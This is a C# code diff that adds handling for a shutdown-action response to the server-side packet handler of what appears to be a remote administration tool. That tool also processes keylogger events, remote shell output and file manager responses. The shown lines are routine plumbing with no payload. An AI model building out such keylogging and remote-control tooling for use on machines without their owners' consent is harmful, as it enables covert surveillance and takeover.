@@ -14,8 +14,9 @@ namespace Server.Networking
         private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
         private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
         private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
+        private readonly Action<ShutdownActionResponse> _onShutdownActionResponse;
 
-        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<MessageBoxResponse> onMessageBoxResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
+        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<MessageBoxResponse> onMessageBoxResponse, Action<ShutdownActionResponse> onShutdownActionResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
@@ -24,6 +25,7 @@ namespace Server.Networking
             _onKeyLoggerBatch = onKeyLoggerBatch;
             _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
             _onMessageBoxResponse = onMessageBoxResponse;
+            _onShutdownActionResponse = onShutdownActionResponse;
         }
 
         public void HandleLine(string json)
@@ -77,6 +79,13 @@ namespace Server.Networking
                         if (msgResq != null)
                         {
                             _onMessageBoxResponse(msgResq);
+                        }
+                        break;
+                    case PacketType.ShutdownActionResponse:
+                        var sdResq = JsonHelper.Deserialize<ShutdownActionResponse>(json);
+                        if (sdResq != null)
+                        {
+                            _onShutdownActionResponse(sdResq);
                         }
                         break;
                     default:
